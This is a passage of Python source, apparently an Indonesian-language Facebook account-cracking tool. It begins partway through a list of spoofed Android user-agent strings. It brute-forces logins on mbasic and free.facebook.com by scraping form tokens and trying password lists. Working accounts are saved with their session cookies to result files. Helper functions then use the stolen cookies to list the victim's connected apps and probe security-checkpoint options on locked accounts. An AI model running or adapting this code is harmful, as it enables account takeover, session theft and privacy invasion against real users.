AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					"referer": "https://free.facebook.com/login/device-based/password/?uid={id}&flow=login_no_pin&refsrc=deprecated&_rdr",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				post_2 = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = data_1, headers = head_1, allow_redirects = True)
				if "c_user" in ses.cookies.get_dict().keys():
					if "y" in apk:
						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						print("\r %s*  --> %s|%s|%s %s"%(H,user,pw,coki,N))
						ok.append("%s|%s|%s"%(user,pw,coki))
						open("Results/OK-%s","a"%(_datetime_)).write("\n%s|%s|%s"%(user,pw,coki))
						cek_aplikasi(coki)
					else:
						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						print("\r %s*  --> %s|%s|%s"%(H,user,pw,coki))
						ok.append("%s|%s|%s"%(user,pw,coki))
						open("Results/OK-%s","a"%(_datetime_)).write("\n%s|%s|%s"%(user,pw,coki))
					break
				elif "checkpoint" in post_2.cookies.get_dict().keys():
					if "y" in opsi:
						print("\r %s*  --> %s|%s"%(user,pw))
						cp.append("%s|%s"%(user,pw))
						cek_opsi(user,pw)
						open("Results/CP-%s","a"%(_datetime_)).write("\n%s|%s"%(user,pw))
					else:
						print("\r %s*  --> %s|%s"%(K,user,pw))
						cp.append("%s|%s"%(user,pw))
						open("Results/CP-%s","a"%(_datetime_)).write("\n%s|%s"%(user,pw))
					break
				else:
					continue
			except requests.exceptions.ConnectionError:time.sleep(30)
		loop +=1

	def kontol(self, user, pwx):
		global loop, ok, cp
		sys.stdout.write("\r Crack: %s/%s %s%s%s/%s%s%s"%(loop,len(id),H,len(ok),N,K,len(cp),N));sys.stdout.flush()
		for pw in pwx:
			ses = requests.Session()
			url = ses.get("https://mbasic.facebook.com/login.php")
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
				"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),
				"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),
				"try_number": "0",
				"unrecognized_tries": "0",
				"email": user,"pass": pw,"login": "Masuk","bi_xrwh": "0"}
			post = ses.post("https://mbasic.facebook.com/login.php",data=data)
			if "c_user" in ses.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r%s *  --> %s|%s|%s"%(H,user,pw,coki))
				ok.append("%s|%s"%(user,pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print("\r%s *  --> %s|%s"%(K,user,pw))
				cp.append("%s|%s"%(user,pw))
				break
			else:
				continue
		loop +=1

def cek_aplikasi(coki):
	try:
		#- aktif
		ses = requests.Session()
		url = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki})
		psot = parser(url.text,"html.parser")
		fick = psot.find("form", {"method":"post"})
		game = [memek.text for memek in fick.find_all("h3")]
		if len(game) == 0:
			print("\r    Tidak ada aplikasi aktif")
		else:
			for kontol in range(len(game)):
				print("\n    %s %s "%(kontol+1, game[kontol].replace(" Di akses pada ", "Di tambahkan pada")));time.sleep(1)
		#- Kadarluarsa
		link = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie":coki})
		post = parser(link.text,"html.parser")
		cari = post.find("form",{"method":"post"})
		game = [kontol_.text for kontol_ in cari.find_all("h3")]
		if len(game) == 0:
			print("\r    Tidak ada aplikasi kadarluarsa")
		else:
			for aplikasi in range(len(game)):
				print("\n    %s %s"%(aplikasi+1, game[aplikasi].replace("Kadarluarsa pada","Tidak di akses pada")));time.sleep(1)
		#- Di hapus
		try:
			link = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=removed", cookies={"cookie":coki})
			post = parser(link.text,"html.parser")
			cari = post.find("form",{"method":"post"})
			game = [_kontol_.text for _kontol_ in cari.find_all("h3")]
			if len(game) == 0:
				print("\r    Tidak ada aplikasi di yang di hapus")
			else:
				for khamdihiXD in range(len(game)):
					print("\n    %s %s"%(khamdihiXD+1, game[khamdihiXD].replace("Di hapus pada","Di hapus")))
		except AttributeError:
			print("    Tidak ada aplikasi yang di hapus/cokie invalid!")


	except AttributeError:
		print(" × cokie invalid")

def cek_opsi(user,pw):
	try:
		ses = requests.Session()
		head = {
			"Host": "free.facebook.com",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"sec-fetch-site": "none",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"sec-ch-ua-mobile": "?1",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		url = ses.get("https://free.facebook.com/login.php")
		_data_ = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),"try_number": "0","unrecognized_tries": "0","email"   : user,"pass"    : pw,"login"   : "Masuk","bi_xrwh" : "0"}
		cari = ses.post("https://free.facebook.com/login.php", data = _data_)
		if "c_user" in ses.cookies.get_dict():
			print("\n    Akun OK tidak terkena sesi♥")
		elif "checkpoint" in ses.cookies.get_dict():
			_html_ = parser(cari.text,"html.parser");_date_ = _html_.find("form",{"method":"post"})["action"]
			_opsi_ = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(cari.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cari.text)).group(1),"checkpoint_data": "","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"', str(cari.text)).group(1)}
			_ke2_ = ses.post("https://free.facebook.com/%s"%(_date_), data = _opsi_)
			_cek_ = parser(_ke2_.text,"html.parser")
			_sih_ = _cek_.find_all("option")
			if len(_sih_) == 0:
				print("\r    %sTidak ada opsi ngab !")
			else:
				for pram in (_sih_):
					print("\r     "+pram.text);time.sleep(1)
		else:
			print("\r     Pewek salah !")
	except:
		pass

def main(email,userx):
	try:
		ses = requests.Session()
		head = {
			"Host": "free.facebook.com",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"sec-fetch-site": "none",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"sec-ch-ua-mobile": "?1",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		url = ses.get("https://free.facebook.com/login.php")
		_data_ = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),"try_number": "0","unrecognized_tries": "0","email"   : email,"pass"    : userx,"login"   : "Masuk","bi_xrwh" : "0"}
		cari = ses.post("https://free.facebook.com/login.php", data = _data_)
		if "c_user" in ses.cookies.get_dict():
			print("\n ✓ Akun OK tidak terkena sesi♥")
		elif "checkpoint" in ses.cookies.get_dict():
			_html_ = parser(cari.text,"html.parser");_date_ = _html_.find("form",{"method":"post"})["action"]
			_opsi_ = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(cari.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cari.text)).group(1),"checkpoint_data": "","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"', str(cari.text)).group(1)}
			_ke2_ = ses.post("https://free.facebook.com/%s"%(_date_), data = _opsi_)
			_cek_ = parser(_ke2_.text,"html.parser")
			_sih_ = _cek_.find_all("option")
			if len(_sih_) == 0:
				exit("\n ✓ Tidak Ada Opsi Ngab !")
			else:
				for pram in (_sih_):
					print("");print(" -> Terdapat %s opsi ngab !"%(len(_sih_)))
					print(" -> "+pram.text);time.sleep(1)
		else:
			print("\n ×  Pewek salah !")
	except Exception as u:print(u)

if __name__ == "__main__":
	menu()